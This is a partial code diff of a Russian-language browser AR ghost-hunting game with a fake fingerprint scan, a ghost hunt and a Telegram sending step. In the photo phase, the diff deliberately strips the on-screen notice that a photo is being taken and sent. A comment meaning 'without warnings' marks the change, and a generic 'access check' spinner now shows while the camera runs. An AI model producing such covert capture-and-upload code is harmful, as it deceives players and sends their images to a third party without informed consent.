+        ctx.fillText(String(Math.max(1, Math.ceil(photo.countdown))), cx, by + bh / 2);
+      }
+      return;
+    }
+    // без предупреждений: просто индикатор проверки доступа
+    ctx.fillStyle = '#ffffff';
+    ctx.font = "800 19px 'Nunito', sans-serif";
+    ctx.fillText('Проверка доступа', cx, 74);
+    ctx.strokeStyle = 'rgba(201,184,255,0.28)';
+    ctx.lineWidth = 7;
+    ctx.beginPath();
+    ctx.arc(cx, VIEW.h / 2 - 10, 62, 0, Math.PI * 2);
+    ctx.stroke();
+    ctx.strokeStyle = '#4cc9f0';
+    ctx.beginPath();
+    ctx.arc(cx, VIEW.h / 2 - 10, 62, t * 3, t * 3 + Math.PI * 0.7);
+    ctx.stroke();
+  }
+
+  function renderScan() {
+    const cx = VIEW.w / 2;
+    const cy = VIEW.h / 2 - 20;
+    const R = 96;
+    ctx.fillStyle = '#ffffff';
+    ctx.font = "800 20px 'Nunito', sans-serif";
+    ctx.fillText('Сканирование отпечатка', cx, 78);
+    ctx.strokeStyle = '#3a2a6a';
+    ctx.lineWidth = 8;
+    ctx.beginPath();
+    ctx.arc(cx, cy, R, 0, Math.PI * 2);
+    ctx.stroke();
+    ctx.strokeStyle = '#4cc9f0';
+    ctx.beginPath();
+    ctx.arc(cx, cy, R, -Math.PI / 2, -Math.PI / 2 + Math.PI * 2 * scan.progress);
+    ctx.stroke();
+    ctx.strokeStyle = scan.progress >= 1 ? '#7dffc4' : '#c9b8ff';
+    ctx.lineWidth = 3;
+    for (let i = 0; i < 4; i++) {
+      const rx = 14 + i * 9;
+      const ry = 18 + i * 10;
+      ctx.beginPath();
+      ctx.ellipse(cx, cy, rx, ry, 0, Math.PI * 0.12, Math.PI * 0.88, false);
+      ctx.stroke();
+      ctx.beginPath();
+      ctx.ellipse(cx, cy, rx, ry, 0, Math.PI * 1.12, Math.PI * 1.88, false);
+      ctx.stroke();
+    }
+    ctx.fillStyle = '#d9cdf5';
+    ctx.font = "600 15px 'Nunito', sans-serif";
+    ctx.fillText('Приложи палец и удерживай', cx, cy + R + 48);
+    if (scan.progress > 0) {
+      ctx.fillStyle = '#4cc9f0';
+      ctx.font = "800 14px 'Nunito', sans-serif";
+      ctx.fillText(Math.round(scan.progress * 100) + '%', cx, cy + R + 72);
+    }
+  }
+
+  function renderGranted() {
+    const cx = VIEW.w / 2;
+    const cy = VIEW.h / 2 - 30;
+    const pulse = 1 + Math.sin(t * 6) * 0.04;
+    ctx.fillStyle = 'rgba(125,255,196,0.12)';
+    ctx.beginPath();
+    ctx.arc(cx, cy, 92 * pulse, 0, Math.PI * 2);
+    ctx.fill();
+    ctx.strokeStyle = '#7dffc4';
+    ctx.lineWidth = 8;
+    ctx.beginPath();
+    ctx.arc(cx, cy, 70, 0, Math.PI * 2);
+    ctx.stroke();
+    ctx.lineCap = 'round';
+    ctx.beginPath();
+    ctx.moveTo(cx - 30, cy + 2);
+    ctx.lineTo(cx - 8, cy + 24);
+    ctx.lineTo(cx + 32, cy - 22);
+    ctx.stroke();
+    ctx.fillStyle = '#ffffff';
+    ctx.font = "800 22px 'Nunito', sans-serif";
+    ctx.fillText('Агент к заданию допущен', cx, cy + 128);
+    ctx.fillStyle = '#d9cdf5';
+    ctx.font = "600 14px 'Nunito', sans-serif";
+    ctx.fillText('Призраки ждут в портале', cx, cy + 156);
+  }
+
+  function renderOutro() {
+    const cx = VIEW.w / 2;
+    ctx.fillStyle = '#ffffff';
+    ctx.font = "800 20px 'Nunito', sans-serif";
+    ctx.fillText('Миссия окончена', cx, 70);
+    if (photo.video && photo.video.videoWidth) {
+      const bw = 200;
+      const bh = 267;
+      const bx = cx - bw / 2;
+      const by = 100;
+      ctx.save();
+      rr(ctx, bx, by, bw, bh, 14);
+      ctx.clip();
+      ctx.translate(bx + bw, by);
+      ctx.scale(-1, 1);
+      const v = photo.video;
+      const s = Math.min(v.videoWidth, v.videoHeight);
+      ctx.drawImage(v, (v.videoWidth - s) / 2, (v.videoHeight - s) / 2, s, s, 0, 0, bw, bh);
+      ctx.restore();
+      if (SHOW_CARD && photo.state === 'preview') {
+        ctx.fillStyle = '#ffffff';
+        ctx.font = "800 60px 'Nunito', sans-serif";
+        ctx.fillText(String(Math.max(1, Math.ceil(photo.countdown))), cx, by + bh / 2);
+      }
+      return;
+    }
+    ctx.fillStyle = '#e6dcff';
+    ctx.font = "600 15px 'Nunito', sans-serif";
+    const lines = wrapText(ctx, OUTRO_TEXT, VIEW.w - 80);
+    lines.forEach((l, i) => ctx.fillText(l, cx, 128 + i * 24));
+    if (outroBusy) {
+      ctx.fillStyle = '#7dffc4';
+      ctx.font = "700 14px 'Nunito', sans-serif";
+      ctx.fillText('Отправляю в Telegram…', cx, mainButtonRect().y - 16);
+    } else {
+      button('Дальше', mainButtonRect(), '#ffe066');
+    }
+  }
+
+  function render2D() {
+    ctx.fillStyle = '#fff';
+    ctx.font = "800 18px 'Nunito', sans-serif";
+    ctx.fillText(`Волна ${hunt.wave + 1} из ${TOTAL_WAVES}`, VIEW.w / 2, 44);
+    ctx.fillStyle = '#d9cdf5';
+    ctx.font = "600 13px 'Nunito', sans-serif";
+    ctx.fillText(`Изгнано: ${hunt.score}   ·   тапай по духам`, VIEW.w / 2, 70);
+    for (const g of hunt.ghosts) drawGhost(g.x, g.y, g.r, g.t);
   }
 
   function render() {
@@ -887,16 +995,16 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     ctx.textAlign = 'center';
     ctx.textBaseline = 'middle';
 
-    if (phase === 'scan') renderScan();
-    else if (phase === 'photo') {
-      if (SHOW_CARD) renderPhoto();
-    }
+    if (phase === 'intro') renderIntro();
+    else if (phase === 'photo') renderPhoto();
+    else if (phase === 'scan') renderScan();
+    else if (phase === 'granted') renderGranted();
     else if (phase === 'hunt' && hunt.mode === '2d') render2D();
     else if (phase === 'hunt') {
       ctx.fillStyle = '#d9cdf5';
       ctx.font = "700 16px 'Nunito', sans-serif";
-      ctx.fillText('Наведи камеру на метку', VIEW.w / 2, VIEW.h / 2);
-    } else if (phase === 'final') renderFinal();
+      ctx.fillText('Загружаю портал…', VIEW.w / 2, VIEW.h / 2);
+    } else if (phase === 'outro' || phase === 'done') renderOutro();
 
     if (toastT > 0 && phase !== 'hunt') {
       ctx.fillStyle = 'rgba(20,14,40,0.82)';
@@ -906,194 +1014,55 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
       ctx.font = "800 15px 'Nunito', sans-serif";
       ctx.fillText(toast, VIEW.w / 2, 116);
     }
-  }
-
-  function renderScan() {
-    ctx.fillStyle = '#fff';
-    ctx.font = "800 20px 'Nunito', sans-serif";
-    ctx.fillText('Сканирование отпечатка', VIEW.w / 2, 78);
-    const cx = VIEW.w / 2;
-    const cy = VIEW.h / 2 - 20;
-    const R = 96;
-    ctx.strokeStyle = '#3a2a6a';
-    ctx.lineWidth = 8;
-    ctx.beginPath();
-    ctx.arc(cx, cy, R, 0, Math.PI * 2);
-    ctx.stroke();
-    ctx.strokeStyle = '#4cc9f0';
-    ctx.beginPath();
-    ctx.arc(cx, cy, R, -Math.PI / 2, -Math.PI / 2 + Math.PI * 2 * scan.progress);
-    ctx.stroke();
-    // отпечаток
-    ctx.strokeStyle = scan.progress >= 1 ? '#7dffc4' : '#c9b8ff';
-    ctx.lineWidth = 3;
-    for (let i = 0; i < 4; i++) {
-      const rx = 14 + i * 9;
-      const ry = 18 + i * 10;
-      ctx.beginPath();
-      ctx.ellipse(cx, cy, rx, ry, 0, Math.PI * 0.12, Math.PI * 0.88, false);
-      ctx.stroke();
-      ctx.beginPath();
-      ctx.ellipse(cx, cy, rx, ry, 0, Math.PI * 1.12, Math.PI * 1.88, false);
-      ctx.stroke();
-    }
-    ctx.beginPath();
-    ctx.moveTo(cx - 6, cy - 40);
-    ctx.lineTo(cx - 6, cy + 40);
-    ctx.stroke();
-    ctx.fillStyle = '#d9cdf5';
-    ctx.font = "600 14px 'Nunito', sans-serif";
-    const txt = scan.progress >= 1 ? 'Доступ разрешён' : 'Приложи и удерживай палец';
-    ctx.fillText(txt, cx, cy + R + 48);
-    if (scan.progress > 0 && scan.progress < 1) {
-      ctx.fillStyle = '#4cc9f0';
-      ctx.font = "800 14px 'Nunito', sans-serif";
-      ctx.fillText(Math.round(scan.progress * 100) + '%', cx, cy + R + 72);
-    }
-  }
-
-  function renderPhoto() {
-    if (!SHOW_CARD) {
-      ctx.fillStyle = '#fff';
-      ctx.font = "800 19px 'Nunito', sans-serif";
-      ctx.fillText('Снимок для доступа', VIEW.w / 2, 74);
-      const cx = VIEW.w / 2;
-      const cy = VIEW.h / 2 - 10;
-      const done = photo.state === 'captured';
-      const fail = photo.state === 'unavailable';
-      ctx.strokeStyle = 'rgba(201,184,255,0.28)';
-      ctx.lineWidth = 7;
-      ctx.beginPath();
-      ctx.arc(cx, cy, 62, 0, Math.PI * 2);
-      ctx.stroke();
-      if (!done && !fail) {
-        const a = t * 3;
-        ctx.strokeStyle = '#4cc9f0';
-        ctx.beginPath();
-        ctx.arc(cx, cy, 62, a, a + Math.PI * 0.7);
-        ctx.stroke();
-      }
-      ctx.fillStyle = done ? '#7dffc4' : fail ? '#ff9fc0' : '#c9b8ff';
-      ctx.font = "800 46px 'Nunito', sans-serif";
-      ctx.fillText(done ? '✓' : fail ? '—' : '◉', cx, cy + 2);
-      ctx.fillStyle = '#d9cdf5';
-      ctx.font = "600 14px 'Nunito', sans-serif";
-      const label = done
-        ? 'Фото отправлено'
-        : fail
-          ? 'Камера недоступна - идём дальше'
-          : 'Разреши камеру и не двигайся';
-      ctx.fillText(label, cx, cy + 108);
-      if (photo.flash > 0) {
-        ctx.fillStyle = `rgba(255,255,255,${Math.min(1, photo.flash)})`;
-        ctx.fillRect(0, 0, VIEW.w, VIEW.h);
-      }
-      return;
-    }
-    ctx.fillStyle = '#fff';
-    ctx.font = "800 19px 'Nunito', sans-serif";
-    ctx.fillText('Фото в удостоверение', VIEW.w / 2, 74);
-    const boxW = VIEW.w - 64;
-    const boxH = Math.round(boxW * 1.05);
-    const bx = 32;
-    const by = 104;
-    ctx.strokeStyle = '#8c6bd6';
-    ctx.lineWidth = 3;
-    rr(ctx, bx, by, boxW, boxH, 14);
-    ctx.stroke();
-    if (photo.state === 'preview' && photo.video && photo.video.videoWidth) {
-      ctx.save();
-      rr(ctx, bx, by, boxW, boxH, 14);
-      ctx.clip();
-      ctx.translate(bx + boxW, by);
-      ctx.scale(-1, 1);
-      const v = photo.video;
-      const s = Math.min(v.videoWidth, v.videoHeight);
-      ctx.drawImage(v, (v.videoWidth - s) / 2, (v.videoHeight - s) / 2, s, s, 0, 0, boxW, boxH);
-      ctx.restore();
-      ctx.fillStyle = '#fff';
-      ctx.font = "800 64px 'Nunito', sans-serif";
-      ctx.fillText(String(Math.max(1, Math.ceil(photo.countdown))), VIEW.w / 2, by + boxH / 2);
-    } else if (photo.state === 'captured') {
-      ctx.fillStyle = '#7dffc4';
-      ctx.font = "800 52px 'Nunito', sans-serif";
-      ctx.fillText('✓', VIEW.w / 2, by + boxH / 2);
-      ctx.fillStyle = '#d9cdf5';
-      ctx.font = "700 15px 'Nunito', sans-serif";
-      ctx.fillText('Фото сделано', VIEW.w / 2, by + boxH / 2 + 52);
-    } else {
-      ctx.fillStyle = '#b9a8e0';
-      ctx.font = "600 14px 'Nunito', sans-serif";
-      ctx.fillText(
-        photo.state === 'unavailable' ? 'Камера недоступна' : 'Нажми, чтобы приложить палец к сенсору',
-        VIEW.w / 2,
-        by + boxH / 2
-      );
-    }
-    if (photo.state === 'idle') button('Сделать снимок', photoButtonRect(), '#ffe066');
     if (photo.flash > 0) {
       ctx.fillStyle = `rgba(255,255,255,${Math.min(1, photo.flash)})`;
       ctx.fillRect(0, 0, VIEW.w, VIEW.h);
     }
   }
 
-  function render2D() {
-    ctx.fillStyle = '#fff';
-    ctx.font = "800 18px 'Nunito', sans-serif";
-    ctx.fillText(`Волна ${hunt.wave + 1} из ${TOTAL_WAVES}`, VIEW.w / 2, 44);
-    ctx.fillStyle = '#d9cdf5';
-    ctx.font = "600 13px 'Nunito', sans-serif";
-    ctx.fillText(`Сбито: ${hunt.score}   ·   тапай по духам`, VIEW.w / 2, 70);
-    for (const g of hunt.ghosts) drawGhost(g.x, g.y, g.r, g.t);
-    ctx.fillStyle = '#b9a8e0';
-    ctx.font = "600 12px 'Nunito', sans-serif";
-    ctx.fillText('Свайп-тап по духу, чтобы изгнать его', VIEW.w / 2, VIEW.h - 22);
+  // ── Ввод ────────────────────────────────────────────────
+  function inside(b, q) {
+    return q.x >= b.x && q.x <= b.x + b.w && q.y >= b.y && q.y <= b.y + b.h;
   }
 
-  function renderFinal() {
-    ctx.fillStyle = '#fff';
-    ctx.font = "800 20px 'Nunito', sans-serif";
-    ctx.fillText(SHOW_CARD ? 'Удостоверение агента' : 'Доступ подтверждён', VIEW.w / 2, 56);
-    let cardBottom = VIEW.h - 210;
-    if (SHOW_CARD && card) {
-      const maxH = VIEW.h - 210 - 82;
-      const ratio = card.height / card.width;
-      const cw = Math.min(VIEW.w - 56, Math.round(maxH / ratio));
-      const ch = Math.round(cw * ratio);
-      const cx = (VIEW.w - cw) / 2;
-      ctx.drawImage(card, cx, 82, cw, ch);
-      cardBottom = 82 + ch;
-    } else if (!SHOW_CARD) {
-      ctx.fillStyle = '#d9cdf5';
-      ctx.font = "600 15px 'Nunito', sans-serif";
-      ctx.fillText('Снимок сделан', VIEW.w / 2, VIEW.h / 2 - 10);
+  function onPointerDown(e) {
+    if (phase === 'hunt' && hunt.mode === 'ar') return;
+    e.preventDefault();
+    const q = toLogical(e.clientX, e.clientY);
+    if (phase === 'intro' && inside(mainButtonRect(), q)) {
+      beginAccess();
+    } else if (phase === 'scan') {
+      scan.holding = true;
+    } else if (phase === 'hunt' && hunt.mode === '2d') {
+      zap2D(q);
+    } else if (phase === 'outro' && !outroBusy && inside(mainButtonRect(), q)) {
+      // жест тапа: камера для финального снимка запускается синхронно
+      runOutro();
     }
-    let status = '';
-    if (sendState === 'sending') status = 'Отправляю в Telegram...';
-    else if (sendState === 'ok') status = 'Отправлено в Telegram ✓';
-    else if (sendState === 'fail') status = photo.failed ? 'Камера недоступна - фото не отправлено' : 'Отправить не удалось';
-    else if (sendState === 'off') status = 'Отправка не настроена';
-    if (status) {
-      ctx.fillStyle = sendState === 'ok' ? '#7dffc4' : sendState === 'fail' ? '#ff9fc0' : '#d9cdf5';
-      ctx.font = "700 13px 'Nunito', sans-serif";
-      ctx.fillText(status, VIEW.w / 2, cardBottom + 22);
-      if (hasTelegram() && sendState !== 'off') {
-        ctx.fillStyle = '#9a8ac0';
-        ctx.font = "600 12px 'Nunito', sans-serif";
-        ctx.fillText('в чат …' + telegramChat().slice(-4), VIEW.w / 2, cardBottom + 40);
-      }
-    }
-    button('Поделиться', shareButtonRect(), '#c9b8ff');
-    button('Дальше', nextButtonRect(), '#ffe066');
   }
+
+  function onPointerUp() {
+    scan.holding = false;
+  }
+
+  // Тап по AR-экрану: запуск видео (жест для iOS) и проверка попадания.
+  const onArPointer = (e) => {
+    if (hunt.mode === 'ar') {
+      playArVideo();
+      tapAr(e);
+    }
+  };
 
   // ── Цикл ────────────────────────────────────────────────
   function step(dt) {
     t += dt;
     if (toastT > 0) toastT -= dt;
+    if (photo.flash > 0) photo.flash -= dt;
     if (phase === 'scan') stepScan(dt);
-    else if (phase === 'photo') stepPhoto(dt);
-    else if (phase === 'hunt') stepHunt(dt);
+    else if (phase === 'granted') {
+      scan.grantedT -= dt;
+      if (scan.grantedT <= 0) enterHunt();
+    } else if (phase === 'hunt') stepHunt(dt);
   }
 
   function frame(ts) {
@@ -1110,21 +1079,21 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
       step(1 / 60);
       acc -= 1 / 60;
     }
-    if (phase !== 'hunt' || hunt.mode === '2d') render();
+    if (!(phase === 'hunt' && hunt.mode === 'ar')) render();
   }
 
   function finishRun() {
     if (finished) return;
     finished = true;
-    stopFrontCam();
-    stopAr();
+    stopPhotoCam();
+    cleanupScene();
     setTimeout(() => {
       if (onWin) onWin();
-    }, 500);
+    }, 300);
     setTimeout(() => {
       running = false;
       if (raf) cancelAnimationFrame(raf);
-    }, 700);
+    }, 500);
   }
 
   canvas.addEventListener('pointerdown', onPointerDown);
@@ -1133,20 +1102,13 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
   canvas.addEventListener('contextmenu', (e) => e.preventDefault());
   const onBlur = () => {
     scan.holding = false;
-    pointer.down = false;
   };
   window.addEventListener('blur', onBlur);
   window.addEventListener('resize', setScale);
-  // тап по AR-экрану запускает видео (жест - важно для iOS)
-  const onArPointer = (e) => {
-    if (hunt.mode === 'ar') {
-      playArVideo();
-      tapAr(e);
-    }
-  };
   if (container) container.addEventListener('pointerdown', onArPointer);
 
   setScale();
+  if (onHint) onHint('Приветствуем, агент');
 
   return {
     start() {
@@ -1159,8 +1121,8 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     destroy() {
       running = false;
       if (raf) cancelAnimationFrame(raf);
-      stopFrontCam();
-      stopAr();
+      stopPhotoCam();
+      cleanupScene();
       canvas.removeEventListener('pointerdown', onPointerDown);
       canvas.removeEventListener('pointerup', onPointerUp);
       canvas.removeEventListener('pointercancel', onPointerUp);
@@ -1181,26 +1143,23 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
       score: () => hunt.score,
       ghosts: () => (hunt.mode === '2d' ? hunt.ghosts.length : 0),
       sendState: () => sendState,
-      // быстрое прохождение фаз
+      // имитация жестов и быстрых переходов для тестов
+      begin: () => beginAccess(),
+      skipPhoto: () => {
+        if (phase === 'photo') enterScan();
+      },
       skipScan: () => {
         if (phase === 'scan') {
           scan.progress = 1;
-          scan.holding = false;
-          enterPhoto();
-        }
-      },
-      skipPhoto: () => {
-        if (phase === 'photo') {
-          stopFrontCam();
-          composeCard(null);
-          enterHunt();
+          enterGranted();
         }
       },
       completeHunt: () => {
-        if (phase === 'hunt') enterFinal();
+        if (phase === 'hunt') enterOutro();
       },
+      pressOutro: () => runOutro(),
       finish: () => finishRun(),
-      // сымитировать отсутствие Telegram, чтобы тесты не делали сетевых запросов
+      // отключить отправку (тесты не делают сетевых запросов)
       disableTelegram: () => {
         tg = {};
       },
